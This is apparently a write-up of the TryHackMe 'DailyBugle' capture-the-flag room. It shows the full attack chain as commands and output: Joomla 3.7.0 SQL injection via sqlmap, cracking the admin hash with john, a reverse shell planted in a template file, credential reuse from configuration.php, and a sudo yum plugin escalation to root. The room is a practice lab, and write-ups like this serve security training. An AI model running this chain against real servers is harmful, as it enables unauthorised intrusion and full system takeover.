# DailyBugle

[Link to the room](https://tryhackme.com/room/dailybugle)

## Let's start

The first question is about who robbed the bank, the answer is in the first article of the webpage: `spiderman` lul.

Next the Joomla version, i just checked `/administrator/manifests/files/joomla.xml` to get that the version being used is `3.7.0`. Looking it in `searchsploit` looks like we can work with that:
```
┌──(kali㉿kali)-[~]
└─$ searchsploit joomla 3.7.0          
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection    | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

According with the exploit information is a blind sql injection. Lets use `sqlmap` then as it is described:

```
sqlmap -u "http://<MACHINE_IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
After a while i was tired of waiting and used this https://github.com/stefanlucas/Exploit-Joomla and got the admin credentials:
```
[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''] 
```

To check the hash type i used `hashid`:
```
┌──(kali㉿kali)-[~]
└─$ hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```
I could have used `hashcat` with the `-m 3200` parameter but i ended up using `john --wordlist=/home/kali/rockyou.txt hashes.txt` and after a while i got the password: `spiderman123` cool.

## Getting access

Now i can login to the admin page but what i really want is a reverse shell. If i go to templates and click in one of the available one to edit the `index.php` file (Url of the file i edited: http://<MACHINE_IP>/administrator/index.php?option=com_templates&view=template&id=503&file=aG9tZQ==) with a reverse shell. Now setting up `netcat`: `nc -lnvp 8080` and visiting http://<MACHINE_IP>/templates/beez3/ gave me a shell nice.

## Privesc to user

Now we need to get privs, i ran `linpeas` and some maunal enumeration and got some interesting things:
```
[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
/proc/sys/kernel/yama/ptrace_scope is enabled (0)

[+] Users with console
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] Files with capabilities (limited to 50):
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

[+] Unexpected in root
/.autorelabel

[+] Mails (limit 50)
9244504    0 -rw-rw----   1 jjameson mail            0 Dec 14  2019 /var/mail/jjameson
9244504    0 -rw-rw----   1 jjameson mail            0 Dec 14  2019 /var/spool/mail/jjameson

bash-4.2$ hostnamectl
   Static hostname: dailybugle
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 4fc91dda78404e5d84ba62e3cbe3a722
           Boot ID: e823ad0ff3564c759435c805bf34f7b2
    Virtualization: xen
  Operating System: CentOS Linux 7 (Core)
       CPE OS Name: cpe:/o:centos:centos:7
            Kernel: Linux 3.10.0-1062.el7.x86_64
      Architecture: x86-64

```

But what was really helpful was the `/var/www/html/configuration.php` file and this database related variables:
```
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
public $dbprefix = 'fb9j5_';
public $live_site = '';
public $secret = 'UAMBRWzHO3oFPmVC';
```

I tried that password with the `jjameson` user and it worked yey. So now we have the user credentials: `jjameson:nv5uz9r3ZEDzVjNu` and we can get the flag:
```
[jjameson@dailybugle ~]$ cat /home/jjameson/user.txt 
**********************
```

## Privesc to root

Well the first thing i tried was `sudo -l` and got something funny:

```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
So i can use `yum` as `sudo`. According with https://gtfobins.github.io/gtfobins/yum/ that is exploitable so i tried the custom plugin method:

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
After executing that i got a root shell and was able to get the flag:
```
sh-4.2# cat /root/root.txt 
**********************
```
